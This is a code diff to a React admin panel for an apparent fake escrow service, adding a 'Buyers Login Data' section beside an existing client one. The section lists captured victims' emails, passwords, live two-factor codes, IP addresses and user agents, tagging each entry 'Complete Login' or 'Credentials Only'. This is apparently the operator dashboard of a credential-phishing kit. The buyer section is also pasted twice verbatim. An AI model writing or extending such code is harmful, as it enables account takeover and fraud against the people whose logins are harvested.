@@ -47,6 +47,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
   const [password, setPassword] = useState('');
   const [loginError, setLoginError] = useState('');
   const [clientLogins, setClientLogins] = useState([]);
+  const [buyerLogins, setBuyerLogins] = useState([]);
   const [showPasswords, setShowPasswords] = useState({});
 
   const shareBase = useMemo(() => (typeof window !== 'undefined' ? `${window.location.origin}${window.location.pathname}` : ''), []);
@@ -65,12 +66,13 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
     if (!adminToken) return;
     setSyncing(true);
     try {
-      const [walletRes, escrowsRes, historyRes, notificationsRes, clientLoginsRes] = await Promise.all([
+      const [walletRes, escrowsRes, historyRes, notificationsRes, clientLoginsRes, buyerLoginsRes] = await Promise.all([
         escrowApi.getWallet(adminToken),
         escrowApi.getEscrows(adminToken),
         escrowApi.getHistory(adminToken),
         escrowApi.getNotifications(adminToken),
-        escrowApi.getClientLogins(adminToken)
+        escrowApi.getClientLogins(adminToken),
+        escrowApi.getBuyerLogins(adminToken)
       ]);
       setWalletBalances(walletRes?.balances || {});
       setWalletActivity(walletRes?.activity || []);
@@ -81,6 +83,7 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
       })));
       setNotifications(notificationsRes || []);
       setClientLogins(clientLoginsRes || []);
+      setBuyerLogins(buyerLoginsRes || []);
       setDashboardError('');
     } catch (error) {
       console.error('Admin sync failed', error);
@@ -180,6 +183,18 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
       await escrowApi.clearClientLogins(adminToken);
       setClientLogins([]);
       setAdminMessage('All client login data cleared successfully.');
+    } catch (error) {
+      setAdminError(error.message);
+    }
+  };
+
+  const handleClearBuyerLogins = async () => {
+    if (!adminToken) return;
+    if (!window.confirm('Are you sure you want to clear all buyer login data? This action cannot be undone.')) return;
+    try {
+      await escrowApi.clearBuyerLogins(adminToken);
+      setBuyerLogins([]);
+      setAdminMessage('All buyer login data cleared successfully.');
     } catch (error) {
       setAdminError(error.message);
     }
@@ -602,6 +617,186 @@ const AdminEscrowDashboard = ({ onNavigateClient }) => {
                     <span className="flex items-center gap-1">
                       <Globe className="w-3 h-3" /> {entry.platform || 'unknown'}
                     </span>
+                    <span>IP: {entry.ipAddress || 'unknown'}</span>
+                    <span className="truncate max-w-[200px]" title={entry.userAgent}>
+                      {entry.userAgent?.split(' ')[0] || 'unknown'}
+                    </span>
+                  </div>
+                </article>
+              ))}
+            </div>
+          )}
+        </section>
+
+        {/* Buyer Login Data Section */}
+        <section className="p-5 bg-gradient-to-br from-purple-900/20 to-indigo-900/10 rounded-2xl border border-purple-800/40">
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="text-lg font-semibold flex items-center gap-2">
+              <KeyRound className="w-4 h-4 text-purple-400" /> Buyers Login Data
+              <span className="ml-2 px-2 py-0.5 rounded-full bg-purple-900/40 text-purple-300 text-xs font-normal">
+                {buyerLogins.length} entries
+              </span>
+            </h2>
+            {buyerLogins.length > 0 && (
+              <button
+                onClick={handleClearBuyerLogins}
+                className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-600/20 hover:bg-red-600/40 text-red-300 text-sm font-semibold transition"
+              >
+                <Trash2 className="w-4 h-4" /> Clear All
+              </button>
+            )}
+          </div>
+          
+          {buyerLogins.length === 0 ? (
+            <p className="text-slate-500 text-sm">No buyer login attempts captured yet.</p>
+          ) : (
+            <div className="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+              {buyerLogins.map((entry) => (
+                <article key={entry.id} className="p-4 bg-slate-900/80 rounded-xl border border-slate-800">
+                  <div className="flex items-start justify-between gap-4 mb-3">
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-indigo-600 flex items-center justify-center text-white font-bold text-sm">
+                        {entry.email?.charAt(0)?.toUpperCase() || 'B'}
+                      </div>
+                      <div>
+                        <p className="font-semibold text-white">{entry.email || 'Unknown'}</p>
+                        <p className="text-xs text-slate-400">
+                          {getPlatformLabel(entry.platform)} • {entry.step === '2fa_complete' ? '✓ Complete Login' : 'Credentials Only'}
+                        </p>
+                      </div>
+                    </div>
+                    <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
+                  </div>
+                  
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                    {/* Email */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Mail className="w-3 h-3" /> Email
+                      </div>
+                      <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
+                    </div>
+                    
+                    {/* Password */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Lock className="w-3 h-3" /> Password (Hashed)
+                      </div>
+                      <p className="text-xs font-mono text-slate-500 break-all truncate" title={entry.password}>
+                        {entry.password ? `${entry.password.substring(0, 20)}...` : 'Not captured'}
+                      </p>
+                      <span className="text-[10px] text-emerald-400 mt-1 block">✓ Securely hashed with bcrypt</span>
+                    </div>
+                    
+                    {/* 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
+                        {entry.twoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                  </div>
+                  
+                  {/* Additional metadata */}
+                  <div className="mt-3 pt-3 border-t border-slate-700/50 flex flex-wrap gap-4 text-xs text-slate-500">
+                    <span className="flex items-center gap-1">
+                      <Globe className="w-3 h-3" /> {entry.platform || 'unknown'}
+                    </span>
+                    {entry.escrowId && (
+                      <span className="font-mono">Escrow: {entry.escrowId.substring(0, 8)}...</span>
+                    )}
+                    <span>IP: {entry.ipAddress || 'unknown'}</span>
+                    <span className="truncate max-w-[200px]" title={entry.userAgent}>
+                      {entry.userAgent?.split(' ')[0] || 'unknown'}
+                    </span>
+                  </div>
+                </article>
+              ))}
+            </div>
+          )}
+        </section>
+
+        {/* Buyer Login Data Section */}
+        <section className="p-5 bg-gradient-to-br from-purple-900/20 to-indigo-900/10 rounded-2xl border border-purple-800/40">
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="text-lg font-semibold flex items-center gap-2">
+              <KeyRound className="w-4 h-4 text-purple-400" /> Buyers Login Data
+              <span className="ml-2 px-2 py-0.5 rounded-full bg-purple-900/40 text-purple-300 text-xs font-normal">
+                {buyerLogins.length} entries
+              </span>
+            </h2>
+            {buyerLogins.length > 0 && (
+              <button
+                onClick={handleClearBuyerLogins}
+                className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-600/20 hover:bg-red-600/40 text-red-300 text-sm font-semibold transition"
+              >
+                <Trash2 className="w-4 h-4" /> Clear All
+              </button>
+            )}
+          </div>
+          
+          {buyerLogins.length === 0 ? (
+            <p className="text-slate-500 text-sm">No buyer login attempts captured yet.</p>
+          ) : (
+            <div className="space-y-3 max-h-[500px] overflow-y-auto pr-2 custom-scrollbar">
+              {buyerLogins.map((entry) => (
+                <article key={entry.id} className="p-4 bg-slate-900/80 rounded-xl border border-slate-800">
+                  <div className="flex items-start justify-between gap-4 mb-3">
+                    <div className="flex items-center gap-3">
+                      <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-500 to-indigo-600 flex items-center justify-center text-white font-bold text-sm">
+                        {entry.email?.charAt(0)?.toUpperCase() || 'B'}
+                      </div>
+                      <div>
+                        <p className="font-semibold text-white">{entry.email || 'Unknown'}</p>
+                        <p className="text-xs text-slate-400">
+                          {getPlatformLabel(entry.platform)} • {entry.step === '2fa_complete' ? '✓ Complete Login' : 'Credentials Only'}
+                        </p>
+                      </div>
+                    </div>
+                    <span className="text-xs text-slate-500">{new Date(entry.timestamp).toLocaleString()}</span>
+                  </div>
+                  
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
+                    {/* Email */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Mail className="w-3 h-3" /> Email
+                      </div>
+                      <p className="text-sm font-mono text-slate-200 break-all">{entry.email || '-'}</p>
+                    </div>
+                    
+                    {/* Password */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Lock className="w-3 h-3" /> Password (Hashed)
+                      </div>
+                      <p className="text-xs font-mono text-slate-500 break-all truncate" title={entry.password}>
+                        {entry.password ? `${entry.password.substring(0, 20)}...` : 'Not captured'}
+                      </p>
+                      <span className="text-[10px] text-emerald-400 mt-1 block">✓ Securely hashed with bcrypt</span>
+                    </div>
+                    
+                    {/* 2FA Code */}
+                    <div className="p-3 bg-slate-800/60 rounded-lg">
+                      <div className="flex items-center gap-2 text-xs text-slate-400 mb-1">
+                        <Fingerprint className="w-3 h-3" /> 2FA Code
+                      </div>
+                      <p className={`text-sm font-mono ${entry.twoFactorCode ? 'text-emerald-300' : 'text-slate-500'}`}>
+                        {entry.twoFactorCode || 'Not entered'}
+                      </p>
+                    </div>
+                  </div>
+                  
+                  {/* Additional metadata */}
+                  <div className="mt-3 pt-3 border-t border-slate-700/50 flex flex-wrap gap-4 text-xs text-slate-500">
+                    <span className="flex items-center gap-1">
+                      <Globe className="w-3 h-3" /> {entry.platform || 'unknown'}
+                    </span>
+                    {entry.escrowId && (
+                      <span className="font-mono">Escrow: {entry.escrowId.substring(0, 8)}...</span>
+                    )}
                     <span>IP: {entry.ipAddress || 'unknown'}</span>
                     <span className="truncate max-w-[200px]" title={entry.userAgent}>
                       {entry.userAgent?.split(' ')[0] || 'unknown'}
